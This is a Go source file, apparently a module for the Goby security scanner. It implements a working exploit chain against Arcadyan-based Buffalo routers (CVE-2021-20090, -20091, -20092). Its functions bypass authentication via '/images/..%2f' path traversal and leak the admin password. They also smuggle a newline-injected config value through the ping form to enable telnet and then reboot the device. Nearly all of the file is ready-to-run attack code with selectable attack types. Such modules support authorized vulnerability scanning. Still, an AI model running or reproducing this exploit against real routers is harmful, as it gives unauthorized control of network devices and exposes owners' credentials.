package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Arcadyan Routers Authentication Bypassing (CVE-2021–20090)",
    "Description": "<p>Arcadian is a widely used WiFi router firmware.</p><p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Product": "WSR-2533DHPL2 firmware version <= 1.02, WSR-2533DHP3 firmware version <= 1.24 and so on",
    "Homepage": "https://www.buffalo.jp",
    "DisclosureDate": "2021-10-25",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "body=\"css/style-ad-JP.css\"",
    "GobyQuery": "body=\"css/style-ad-JP.css\"",
    "Level": "3",
    "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.buffalo.jp/news/detail/20211004-02.html\">https://www.buffalo.jp/news/detail/20211004-02.html</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.2. If not necessary, prohibit public network access to the system.</p>",
    "Translation": {
        "CN": {
            "Name": "Arcadyan 路由器固件 Authentication 认证绕过 (CVE-2021–20090)",
            "Product": "WSR-2533DHPL2 firmware version <= 1.02, WSR-2533DHP3 firmware version <= 1.24 and so on",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过",
                "两高一弱"
            ],
            "Description": "<p>Arcadyan是一个运用广泛的路由器固件。</p><p>攻击者可以通过未经授权的访问漏洞控制整个系统，并最终导致系统处于极不安全的状态。</p>",
            "Impact": "<p>攻击者可以通过未经授权的访问漏洞控制整个系统，并最终导致系统处于极不安全的状态。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.buffalo.jp/news/detail/20211004-02.html\">https://www.buffalo.jp/news/detail/20211004-02.html</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>"
        },
        "EN": {
            "Name": "Arcadyan Routers Authentication Bypassing (CVE-2021–20090)",
            "Product": "WSR-2533DHPL2 firmware version <= 1.02, WSR-2533DHP3 firmware version <= 1.24 and so on",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass",
                "2H1W"
            ],
            "Description": "<p>Arcadian is a widely used WiFi router firmware.</p><p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
            "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.buffalo.jp/news/detail/20211004-02.html\">https://www.buffalo.jp/news/detail/20211004-02.html</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.<br>2. If not necessary, prohibit public network access to the system.</p>"
        }
    },
    "References": [
        "https://www.buffalo.jp"
    ],
    "RealReferences": [
        "https://medium.com/tenable-techblog/bypassing-authentication-on-arcadyan-routers-with-cve-2021-20090-and-rooting-some-buffalo-ea1dd30980c2",
        "https://zh-cn.tenable.com/security/research/tra-2021-13?tns_redirect=true"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "getInfo,getAdminPwd,openTelnet,closeTelnet",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass",
        "2H1W"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2021–20090"
    ],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.1",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9960"
}`

	extractToken := func(u *httpclient.FixUrl, rawBody string) string {
		m := regexp.MustCompile(`<img title=spacer src="(.*?)"`).FindStringSubmatch(rawBody)
		if len(m) <= 1 || len(m[1]) < 78 {
			return ""
		}
		httoken, err := base64.StdEncoding.DecodeString(m[1][78:])
		if err != nil {
			return ""
		}
		return string(httoken)
	}

	getInfo := func(u *httpclient.FixUrl) string {
		cfg := httpclient.NewGetRequestConfig("/images/..%2finfo.html")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			httoken := extractToken(u, resp.RawBody)
			if len(httoken) == 0 {
				return ""
			}

			t := strconv.FormatInt(time.Now().Unix(), 10) + "000"

			cfgInfo := httpclient.NewGetRequestConfig(fmt.Sprintf("/cgi/cgi_info.js?_tn=%s&_t=%s&_=%s", httoken, t, t))
			cfgInfo.VerifyTls = false
			cfgInfo.FollowRedirect = false
			cfgInfo.Header.Store("Referer", u.FixedHostInfo+"/info.html")
			if respInfo, err := httpclient.DoHttpRequest(u, cfgInfo); err == nil {
				if respInfo.StatusCode == 200 && strings.Contains(respInfo.RawBody, "FirmwareVersion") {
					return respInfo.RawBody
				}
			}
		}
		return ""
	}

	getAdminPwd := func(u *httpclient.FixUrl) string {
		cfg := httpclient.NewGetRequestConfig("/loginerror.html")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			httoken := extractToken(u, resp.RawBody)
			if len(httoken) == 0 {
				return ""
			}

			t := strconv.FormatInt(time.Now().Unix(), 10) + "000"

			cfgInfo := httpclient.NewGetRequestConfig(fmt.Sprintf("/cgi/cgi_i_filter.js?_tn=%s&_t=%s&_=%s", httoken, t, t))
			cfgInfo.VerifyTls = false
			cfgInfo.FollowRedirect = false
			cfgInfo.Header.Store("Referer", u.FixedHostInfo+"/loginerror.html")
			if respInfo, err := httpclient.DoHttpRequest(u, cfgInfo); err == nil {
				if respInfo.StatusCode == 200 {
					mPwd := regexp.MustCompile(`var login_password = "(.*?)";`).FindStringSubmatch(respInfo.RawBody)
					if len(mPwd) > 0 {
						return mPwd[1]
					}
				}
			}
		}
		return ""
	}

	reboot := func(u *httpclient.FixUrl) bool {
		cfg := httpclient.NewGetRequestConfig("/images/..%2fsave_init.html")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			httoken := extractToken(u, resp.RawBody)
			if len(httoken) == 0 {
				return false
			}

			cfgReboot := httpclient.NewPostRequestConfig("/images/..%2fapply_abstract.cgi")
			cfgReboot.VerifyTls = false
			cfgReboot.FollowRedirect = false
			cfgReboot.Header.Store("Referer", u.FixedHostInfo+"/save_init.html")
			cfgReboot.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfgReboot.Data = `action=reboot&httoken=` + httoken + `&submit_button=setting_basic.html&action_params=blink_time%3D5`
			if respReboot, err := httpclient.DoHttpRequest(u, cfgReboot); err == nil {
				if strings.Contains(respReboot.Header.Get("Location"), "/Success.htm") {
					return true
				}
			}
		}
		return false
	}

	setTelnetd := func(u *httpclient.FixUrl, openTelnetd bool) bool {
		cfg := httpclient.NewGetRequestConfig("/images/..%2fping.html")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			httoken := extractToken(u, resp.RawBody)
			if len(httoken) == 0 {
				return false
			}

			// 注入配置
			// 有时访问 /apply_abstract.cgi 没权限，故改成 /images/..%2fapply_abstract.cgi
			cfgPing := httpclient.NewPostRequestConfig("/images/..%2fapply_abstract.cgi")
			cfgPing.VerifyTls = false
			cfgPing.FollowRedirect = false
			cfgPing.Header.Store("Referer", u.FixedHostInfo+"/ping.html")
			cfgPing.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			if openTelnetd {
				cfgPing.Data = `action=start_ping&httoken=` + httoken + `&submit_button=ping.html&action_params=blink_time%3D5&ARC_ping_ipaddress=8.8.8.8%0aARC_SYS_TelnetdEnable%3d1&ARC_ping_status=0&TMP_Ping_Type=4`
			} else {
				cfgPing.Data = `action=start_ping&httoken=` + httoken + `&submit_button=ping.html&action_params=blink_time%3D5&ARC_ping_ipaddress=8.8.8.8%0aARC_SYS_TelnetdEnable%3d0&ARC_ping_status=0&TMP_Ping_Type=4`
			}
			if respPing, err := httpclient.DoHttpRequest(u, cfgPing); err == nil {
				if strings.Contains(respPing.Header.Get("Location"), "/Success.htm") {
					time.Sleep(1 * time.Second)
					return reboot(u)
				}
			}
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			info := getInfo(u)
			return len(info) > 0
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			if attackType == "getInfo" {
				info := getInfo(expResult.HostInfo)
				if len(info) > 0 {
					expResult.Success = true
					expResult.Output = info
				}
				return expResult
			} else if attackType == "getAdminPwd" {
				c := getAdminPwd(expResult.HostInfo)
				if len(c) > 0 {
					expResult.Success = true
					expResult.Output = c
				} else {
					expResult.Output = "This target may not affected by password infoleak (CVE-2021-20092)"
				}
				return expResult
			} else if attackType == "openTelnet" {
				if setTelnetd(expResult.HostInfo, true) {
					expResult.Success = true
					expResult.Output = "Waiting target to reboot for about 80 seconds, then try to telnet " + expResult.HostInfo.IP + " to execute command. If not success, try one more time."
				} else {
					expResult.Output = "This target may not affected by Configuration File Injection (CVE-2021-20091)"
				}
				return expResult
			} else if attackType == "closeTelnet" {
				if setTelnetd(expResult.HostInfo, false) {
					expResult.Success = true
					expResult.Output = "Waiting target to reboot for about 80 seconds, then try to telnet " + expResult.HostInfo.IP + " to see if telnetd is shutdown. If not success, try one more time."
				} else {
					expResult.Output = "This target may not affected by Configuration File Injection (CVE-2021-20091)"
				}
				return expResult
			}

			return expResult
		},
	))

}